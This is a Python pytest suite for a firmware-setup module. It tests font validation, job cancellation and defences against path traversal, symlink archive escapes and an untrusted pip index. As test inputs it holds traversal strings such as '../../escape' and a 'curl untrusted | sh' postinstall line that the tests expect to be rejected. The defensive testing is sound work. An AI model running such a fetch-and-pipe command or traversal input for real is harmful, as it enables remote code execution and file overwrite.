"""Isolated prerequisite/security tests. No download or USB is used here."""
import importlib.util
import json
from pathlib import Path
import time
import sys

import pytest
from core import firmware_setup as setup, firmware_tasks as fw, desktop_service, state_store


@pytest.fixture
def lab(tmp_path,monkeypatch):
    monkeypatch.setenv('INKSIGHT_FIRMWARE_HOME',str(tmp_path/'private tools'))
    monkeypatch.setattr(setup,'_WORKERS',{})
    monkeypatch.setattr(setup,'_MANIFEST_CACHE',{})
    monkeypatch.setattr(setup.platform,'system',lambda:'Darwin')
    monkeypatch.setattr(setup.platform,'machine',lambda:'arm64')
    monkeypatch.setattr(setup.platform,'mac_ver',lambda:('26.5.2',(),''))
    return setup.home()


def generation(kind):
    path=setup.home()/'generations'/(kind+'-unit');path.mkdir(parents=True)
    return path


def test_clean_status_no_download_and_host_support(lab,monkeypatch):
    monkeypatch.setattr(setup.subprocess,'Popen',lambda *a,**k:pytest.fail('status must not start commands'))
    status=setup.status()
    assert not status['fonts']['ready'] and not status['tools']['ready']
    expected='not_installed' if sys.version_info[:2]==(3,11) else 'unsupported_runtime'
    assert status['tools']['state']==expected and status['host']['ready']
    assert status['writes_device'] is False and status['calls_paid_model'] is False
    monkeypatch.setattr(setup.platform,'machine',lambda:'x86_64')
    assert setup.host_status()['state']=='unsupported'
    with pytest.raises(RuntimeError):setup.start('tools')
    monkeypatch.setattr(setup.platform,'machine',lambda:'arm64')
    monkeypatch.setattr(setup.platform,'mac_ver',lambda:('26.4',(),''))
    assert not setup.host_status()['ready']


def test_atomic_font_set_and_complete_tamper_detection(lab):
    folder=generation('fonts');source=folder/'src';source.mkdir()
    for name in setup.FONT_NAMES:
        file=source/name;file.parent.mkdir(exist_ok=True);file.write_bytes(b'isolated synthetic header')
    files=setup._manifest(source,setup.FONT_NAMES)
    state_store.write_json(source/'manifest.json',{'files':files},meta=False)
    setup._write_pointer('fonts',folder)
    assert setup.fonts_status()['ready']
    (source/setup.FONT_NAMES[0]).write_bytes(b'changed')
    assert not setup.fonts_status()['ready']
    (source/setup.FONT_NAMES[0]).unlink()
    assert not setup.fonts_status()['ready']


def test_pointer_traversal_and_symlink_rejected(lab,tmp_path):
    lab.mkdir(parents=True)
    for ident in ['../../escape','/fonts-absolute','fonts-a/../../escape']:
        state_store.write_json(lab/'fonts-current.json',{'generation':ident},meta=False)
        assert setup.font_source() is None
    folder=generation('fonts');folder.rmdir();folder.symlink_to(tmp_path,target_is_directory=True)
    state_store.write_json(lab/'fonts-current.json',{'generation':folder.name},meta=False)
    assert setup.font_source() is None


def test_restarted_preparation_becomes_interrupted_not_ready(lab):
    setup._set('tools-interrupted',status='running',kind='tools')
    assert setup.status()['jobs'][0]['status']=='interrupted'
    assert setup.active_jobs()==0 and not setup.tools_status()['ready']


def test_upload_names_cannot_write_user_paths_and_bad_file_rejected(lab,monkeypatch):
    class Deferred:
        def __init__(self,**_kw):pass
        def start(self):pass
    monkeypatch.setattr(setup.threading,'Thread',Deferred)
    job=setup.start('fonts',{'regular':('../../outside.ttf',b'x'),'bold':('/tmp/outside.otf',b'y')})
    directory=lab/'generations'/job['id']
    assert (directory/'regular.font.ttf').read_bytes()==b'x'
    assert not (lab/'outside.ttf').exists()
    with pytest.raises(RuntimeError,match='已有准备任务'):setup.start('fonts')
    setup._run(job['id'],'fonts',directory)
    assert setup._read()['jobs'][job['id']]['status']=='failed'
    assert setup.font_source() is None


def test_failed_or_cancelled_generation_keeps_previous_pointer(lab,monkeypatch):
    old=generation('fonts');setup._write_pointer('fonts',old)
    directory=lab/'generations/fonts-new';directory.mkdir()
    setup._set('fonts-new',kind='fonts',status='queued')
    monkeypatch.setattr(setup,'_fonts_job',lambda *a:(_ for _ in ()).throw(RuntimeError('offline')))
    setup._run('fonts-new','fonts',directory)
    assert setup.font_source()==old/'src'
    assert setup._read()['jobs']['fonts-new']['status']=='failed'
    setup._set('fonts-new',status='queued')
    setup.cancel('fonts-new')
    with pytest.raises(RuntimeError,match='cancelled'):setup._check_cancel('fonts-new')


def test_private_environment_no_developer_cache_or_tls_bypass(lab,monkeypatch):
    monkeypatch.setenv('PIP_INDEX_URL','http://untrusted.invalid')
    monkeypatch.setenv('PLATFORMIO_CORE_DIR','/developer/cache')
    monkeypatch.setenv('PYTHONPATH','/developer/modules')
    env=setup._env(lab)
    assert env['PLATFORMIO_CORE_DIR']==str(lab/'pio-core')
    assert env['PIP_NO_CACHE_DIR']=='1' and env['PIP_CONFIG_FILE']=='/dev/null'
    assert not any(key in env for key in ['PIP_INDEX_URL','PYTHONPATH','PIP_TRUSTED_HOST'])


def test_archive_paths_fail_closed(tmp_path):
    spec=importlib.util.spec_from_file_location('guarded_pio',setup.ROOT/'shared/tools/firmware_pio.py')
    wrapper=importlib.util.module_from_spec(spec);spec.loader.exec_module(wrapper)
    for name in ['../escape','/absolute','x/../../escape','x\\escape']:
        with pytest.raises(ValueError):wrapper.checked_path(tmp_path,name)
    assert wrapper.checked_path(tmp_path,'safe/file')==tmp_path/'safe/file'


def test_probe_binding_single_use_and_timeout(lab,monkeypatch):
    monkeypatch.setattr(fw,'_PROBE_CACHE',{'probe-1':{'mac':'AABBCCDDEEFF','confirmation_token':'secret','expires_at':time.time()+20}})
    with pytest.raises(RuntimeError):fw.consume_probe('probe-1','wrong')
    assert fw.consume_probe('probe-1','secret')['mac']=='AABBCCDDEEFF'
    with pytest.raises(RuntimeError):fw.consume_probe('probe-1','secret')


def test_preparation_durable_jobs_protect_safe_quit(lab,monkeypatch):
    monkeypatch.setattr(fw,'_read',lambda:fw._empty())
    from core import manual_issue
    monkeypatch.setattr(manual_issue,'_read',lambda:{'tasks':{}})
    setup._set('tools-test',status='queued',kind='tools')
    desktop_service.gate.pause()
    assert desktop_service.status()['safe_to_stop'] is False
    setup._set('tools-test',status='cancelled')
    assert desktop_service.status()['safe_to_stop'] is True


def test_pause_still_allows_safe_preparation_cancellation(lab):
    setup._set('tools-pause',status='running',kind='tools')
    desktop_service.gate.pause()
    assert setup.cancel('tools-pause')['cancel_requested'] is True
    with pytest.raises(RuntimeError,match='cancelled'):setup._check_cancel('tools-pause')


def test_low_space_and_unwritable_stop_before_worker(lab,monkeypatch):
    from collections import namedtuple
    monkeypatch.setattr(setup.shutil,'disk_usage',lambda _:namedtuple('Usage','total used free')(100,99,1))
    assert setup.storage_status()['state']=='low_space'
    with pytest.raises(RuntimeError,match='4 GiB'):setup.start('fonts')
    assert not (lab/'generations').exists()
    lab.rmdir();lab.write_text('not a directory')
    assert setup.storage_status()['state']=='unwritable'


@pytest.mark.parametrize('suffix,is_ttf',[('.ttf',True),('.otf',False)])
def test_actual_static_font_parsing_and_rejections(tmp_path,suffix,is_ttf):
    # Entirely synthetic outlines/names, not a MiSans font copy or a claim
    # that the official downloadable fonts have been exercised through UI.
    from fontTools.fontBuilder import FontBuilder
    from fontTools.pens.ttGlyphPen import TTGlyphPen
    from fontTools.pens.t2CharStringPen import T2CharStringPen
    from fontTools.ttLib import TTFont,newTable
    importer=setup._importer()
    path=tmp_path/('synthetic'+suffix)
    fb=FontBuilder(1000,isTTF=is_ttf)
    fb.setupGlyphOrder(['.notdef','A'])
    fb.setupCharacterMap({65:'A'})
    fb.setupHorizontalMetrics({name:(500,0) for name in ['.notdef','A']})
    fb.setupHorizontalHeader(ascent=800,descent=-200)
    fb.setupNameTable({'familyName':'MiSans Synthetic Validation Fixture','styleName':'Regular',
                       'uniqueFontIdentifier':'InkSight synthetic fixture','psName':'InkSightFixture',
                       'fullName':'InkSight Test Fixture','version':'Version 1.0'})
    fb.setupOS2(sTypoAscender=800,sTypoDescender=-200,usWinAscent=800,usWinDescent=200,usWeightClass=400)
    fb.setupPost()
    if is_ttf:
        fb.setupGlyf({name:TTGlyphPen(None).glyph() for name in ['.notdef','A']})
    else:
        fb.setupCFF('InkSightFixture',{},
                    {name:T2CharStringPen(500,None).getCharString() for name in ['.notdef','A']},{})
    fb.setupMaxp();fb.save(path)
    assert importer.validate_font(path,'常规','A')['size_bytes']>0
    font=TTFont(path);font['OS/2'].usWeightClass=330;font.save(path);font.close()
    assert importer.validate_font(path,'常规','A')['size_bytes']>0
    with pytest.raises(importer.FontImportError,match='缺少'):importer.validate_font(path,'常规','AB')
    with pytest.raises(importer.FontImportError,match='Bold'):importer.validate_font(path,'粗体','A')
    def rename(font,name_id,text):
        for record in list(font['name'].names):
            if record.nameID==name_id:
                font['name'].setName(text,name_id,record.platformID,record.platEncID,record.langID)
    font=TTFont(path);font['OS/2'].usWeightClass=700
    rename(font,2,'Bold');font.save(path);font.close()
    assert importer.validate_font(path,'粗体','A')['family'].startswith('MiSans')
    font=TTFont(path);font['OS/2'].usWeightClass=630;font.save(path);font.close()
    assert importer.validate_font(path,'粗体','A')['size_bytes']>0
    with pytest.raises(importer.FontImportError,match='400'):importer.validate_font(path,'常规','A')
    font=TTFont(path);rename(font,1,'Other Family');font.save(path);font.close()
    with pytest.raises(importer.FontImportError,match='不是 MiSans'):importer.validate_font(path,'粗体','A')
    font=TTFont(path);rename(font,1,'MiSans Synthetic')
    variable=newTable('fvar');variable.axes=[];variable.instances=[];font['fvar']=variable
    font.save(path);font.close()
    with pytest.raises(importer.FontImportError,match='可变'):importer.validate_font(path,'粗体','A')
    path.write_bytes(b'ttcf'+b'\0'*32)
    with pytest.raises(importer.FontImportError,match='TTC'):importer.validate_font(path,'常规','A')


def test_both_archive_bulk_extractors_reject_before_writes(tmp_path):
    import io,tarfile,zipfile
    spec=importlib.util.spec_from_file_location('guarded_pio_bulk',setup.ROOT/'shared/tools/firmware_pio.py')
    wrapper=importlib.util.module_from_spec(spec);spec.loader.exec_module(wrapper)
    archive=io.BytesIO()
    with tarfile.open(fileobj=archive,mode='w') as handle:
        safe=tarfile.TarInfo('safe');safe.size=1;handle.addfile(safe,io.BytesIO(b'x'))
        link=tarfile.TarInfo('escape');link.type=tarfile.SYMTYPE;link.linkname='../../outside';handle.addfile(link)
    archive.seek(0)
    with tarfile.open(fileobj=archive) as handle:
        with pytest.raises(ValueError):wrapper.tar_extractall(handle,tmp_path)
    assert not (tmp_path/'safe').exists()
    archive=io.BytesIO()
    with zipfile.ZipFile(archive,'w') as handle:
        handle.writestr('safe','x');handle.writestr('../outside','bad')
    archive.seek(0)
    with zipfile.ZipFile(archive) as handle:
        with pytest.raises(ValueError):wrapper.zip_extractall(handle,tmp_path)
    assert not (tmp_path/'safe').exists()


def test_build_timeout_terminates_own_compiler_group(tmp_path,monkeypatch):
    import signal,subprocess
    import sys
    # A real subprocess, but no compiler/download/USB. The helper owns and
    # terminates its own process group without touching any App/service.
    markers=tmp_path/'pid.txt'
    script="import os,time;from pathlib import Path;Path(__import__('sys').argv[1]).write_text(str(os.getpid()));time.sleep(30)"
    with pytest.raises(subprocess.TimeoutExpired):
        fw._run_build_command([sys.executable,'-c',script,str(markers)],timeout=.3,env=setup._env(tmp_path),cwd=tmp_path)
    if markers.exists():
        with pytest.raises(ProcessLookupError):__import__('os').kill(int(markers.read_text()),0)


def test_build_diagnostics_bounded_and_unicode_safe(tmp_path):
    import sys
    result=fw._run_build_command([sys.executable,'-c',"print('界'*800000)"],timeout=10,
                                 env=setup._env(tmp_path),cwd=tmp_path)
    assert result.returncode==0 and result.stdout.endswith('\n')
    assert len(result.stdout.encode())<=2*1024**2+3


def test_only_known_esptool_hook_uses_separate_hash_lock(lab,monkeypatch):
    from types import SimpleNamespace
    spec=importlib.util.spec_from_file_location('guarded_pio_hook',setup.ROOT/'shared/tools/firmware_pio.py')
    wrapper=importlib.util.module_from_spec(spec);spec.loader.exec_module(wrapper)
    monkeypatch.setenv('PLATFORMIO_CORE_DIR',str(lab/'core'))
    pkg=SimpleNamespace(path=str(lab/'core/packages/tool-esptoolpy'))
    manifest={'name':'tool-esptoolpy','version':'2.41100.260830',
              'scripts':{'postinstall':'package-postinstall.py'}}
    manager=SimpleNamespace(load_manifest=lambda _pkg:manifest)
    calls=[];monkeypatch.setattr(wrapper.subprocess,'run',lambda args,**kwargs:calls.append((args,kwargs)))
    wrapper.controlled_pkg_script(manager,pkg,'postinstall')
    args,kwargs=calls[0]
    assert '--require-hashes' in args and '--only-binary=:all:' in args
    assert args[-1].endswith('requirements-esptool-py311-macos-arm64.lock')
    assert kwargs['check'] and 'shell' not in kwargs
    for field,value in [('version','unapproved'),('name','other-tool')]:
        old=manifest[field];manifest[field]=value
        with pytest.raises(RuntimeError,match='Unapproved'):wrapper.controlled_pkg_script(manager,pkg,'postinstall')
        manifest[field]=old
    manifest['scripts']['postinstall']='curl untrusted | sh'
    with pytest.raises(RuntimeError,match='Unapproved'):wrapper.controlled_pkg_script(manager,pkg,'postinstall')
    assert len(calls)==1


@pytest.mark.parametrize('diagnostic,expected',[
    ('SSLError: CERTIFICATE_VERIFY_FAILED','TLS证书'),
    ('ConnectionError: Network is unreachable','可能离线'),
    ('No matching distribution found for pinned','固定版本'),
    ('THESE PACKAGES DO NOT MATCH THE HASHES','摘要校验'),
    ('OSError: No space left on device','空间不足'),
])
def test_failed_command_has_safe_actionable_diagnostic(lab,diagnostic,expected):
    import sys
    directory=generation('tools');ident=directory.name
    setup._set(ident,status='running',kind='tools')
    with pytest.raises(RuntimeError,match=expected):
        setup._command(ident,[sys.executable,'-c','import sys;print(sys.argv[1]);sys.exit(1)',diagnostic],
                       env=setup._env(directory),timeout=5,cwd=directory)
    assert setup._pointer('tools') is None


def test_cancel_running_command_stops_only_owned_process(lab,monkeypatch):
    import os,sys
    directory=generation('tools');ident=directory.name
    setup._set(ident,status='running',kind='tools')
    checks=0
    def checkpoint(_ident):
        nonlocal checks
        checks+=1
        if checks>=3:raise RuntimeError('cancelled')
    monkeypatch.setattr(setup,'_check_cancel',checkpoint)
    marker=directory/'owned-pid.txt'
    script="import os,time,sys;from pathlib import Path;Path(sys.argv[1]).write_text(str(os.getpid()));time.sleep(30)"
    with pytest.raises(RuntimeError,match='cancelled'):
        setup._command(ident,[sys.executable,'-c',script,str(marker)],env=setup._env(directory),timeout=5,cwd=directory)
    if marker.exists():
        with pytest.raises(ProcessLookupError):os.kill(int(marker.read_text()),0)


def test_missing_cloud_is_not_reported_as_filled(lab,monkeypatch):
    monkeypatch.setattr(fw,'_input_snapshot',lambda:({}, {'cloud':{}}, 'synthetic'))
    cloud=fw.preflight()['checks']['cloud']
    assert not cloud['ready'] and cloud['state']=='missing'
    assert '请填写' in cloud['detail'] and '已填写' not in cloud['detail']


def test_cancelled_job_has_human_readable_detail(lab,monkeypatch):
    directory=generation('fonts');ident=directory.name
    setup._set(ident,status='queued')
    monkeypatch.setattr(setup,'_fonts_job',lambda *_a:(_ for _ in ()).throw(RuntimeError('cancelled')))
    setup._run(ident,'fonts',directory)
    row=setup._read()['jobs'][ident]
    assert row['status']=='cancelled' and '已取消' in row['detail']


def test_arduino_properties_and_versioned_folder_are_recognized(tmp_path):
    folder=tmp_path/'Adafruit GFX Library@1.12.6';folder.mkdir()
    (folder/'library.properties').write_text('# metadata\nname=Adafruit GFX Library\nversion=1.12.6\nurl=https://example.invalid/?a=b\n')
    assert setup._package_info(folder)==('Adafruit GFX Library','1.12.6')
    (folder/'library.json').write_text(json.dumps({'name':'Adafruit GFX Library','version':'1.12.6'}))
    assert setup._package_info(folder)==('Adafruit GFX Library','1.12.6')


def test_supported_library_dependencies_are_preinstalled_in_dependency_order():
    import configparser
    config=configparser.ConfigParser(interpolation=None)
    config.read(setup.ROOT/'shared/firmware/platformio.ini')
    deps=config['env:'+setup.TARGET]['lib_deps'].strip().splitlines()
    assert deps[:3]==['adafruit/Adafruit BusIO@1.17.4','adafruit/Adafruit GFX Library@1.12.6','zinggjm/GxEPD2@1.6.9']
